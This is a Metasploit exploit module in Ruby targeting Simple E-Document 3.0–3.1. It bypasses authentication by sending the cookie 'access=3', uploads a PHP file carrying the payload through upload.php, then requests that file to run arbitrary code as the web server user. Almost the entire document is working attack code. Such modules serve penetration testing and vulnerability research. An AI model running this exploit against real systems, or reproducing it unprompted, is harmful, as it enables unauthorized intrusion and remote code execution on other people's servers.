##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Simple E-Document Arbitrary File Upload",
      'Description'    => %q{
        This module exploits a file upload vulnerability found in Simple
        E-Document versions 3.0 to 3.1. Attackers can bypass authentication and
        abuse the upload feature in order to upload malicious PHP files which
        results in arbitrary remote code execution as the web server user. File
        uploads are disabled by default.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'vinicius777[at]gmail.com', # Auth bypass discovery and PoC, kinda
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
        ],
      'References'     =>
        [
          # This EDB uses SQLI for auth bypass which isn't needed.
          # Sending "Cookie: access=3" with all requests is all
          # that's needed for auth bypass.
          ['EDB', '31142']
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it's unlimited
          'Space'       => 262144 # 256k
        },
      'Arch'           => ARCH_PHP,
      'Platform'       => 'php',
      'Targets'        =>
        [
          # Tested on Simple E-Document versions 3.0 and 3.1
          [ 'Generic (PHP Payload)', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jan 23 2014',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Simple E-Document', '/simple_e_document_v_1_31/'])
        ], self.class)
  end

  #
  # Checks if target allows file uploads
  #
  def check
    res = send_request_raw({
      'uri'    => normalize_uri(target_uri.path, 'upload.php'),
      'cookie' => 'access=3'
    })

    unless res
      vprint_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    if res.body and res.body.to_s =~ /File Uploading Has Been Disabled/
      vprint_error("#{peer} - File uploads are disabled")
      return Exploit::CheckCode::Safe
    end

    if res.body and res.body.to_s =~ /Upload File/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  #
  # Uploads our malicious file
  #
  def upload
    @fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    php  = "<?php #{payload.encoded} ?>"

    data = Rex::MIME::Message.new
    data.add_part('upload', nil, nil, 'form-data; name="op1"')
    data.add_part(php, 'application/octet-stream', nil, "form-data; name=\"fileupload\"; filename=\"#{@fname}\"")
    post_data = data.to_s.gsub(/^\r\n--_Part_/, '--_Part_')

    print_status("#{peer} - Uploading malicious file...")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, 'upload.php'),
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'cookie'   => 'access=3',
      'data'     => post_data,
      'vars_get' => {
        'op' => 'newin'
      }
    })

    fail_with(Failure::Unknown, "#{peer} - Request timed out while uploading") unless res
    fail_with(Failure::NotFound, "#{peer} - No upload.php found") if res.code.to_i == 404
    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to write #{@fname}") if res.body and (res.body =~ /Couldn't copy/ or res.body !~ /file uploaded\!/)

    print_good("#{peer} - Payload uploaded successfully.")
    register_files_for_cleanup(@fname)

    if res.body.to_s =~ /<br>folder to use: .+#{target_uri.path}\/?(.+)<br>/
        @upload_path = normalize_uri(target_uri.path, "#{$1}")
        print_good("#{peer} - Found upload path #{@upload_path}")
    else
        @upload_path = normalize_uri(target_uri.path, 'in')
        print_warning("#{peer} - Could not find upload path - assuming '#{@upload_path}'")
    end
  end

  #
  # Executes our uploaded malicious file
  #
  def exec
    print_status("#{peer} - Executing #{@fname}...")
    res = send_request_raw({
      'uri'    => normalize_uri(@upload_path, @fname),
      'cookie' => 'access=3'
    })
    if res and res.code == 404
      fail_with(Failure::NotFound, "#{peer} - Not found: #{@fname}")
    end
  end

  #
  # Just upload and execute
  #
  def exploit
    upload
    exec
  end
end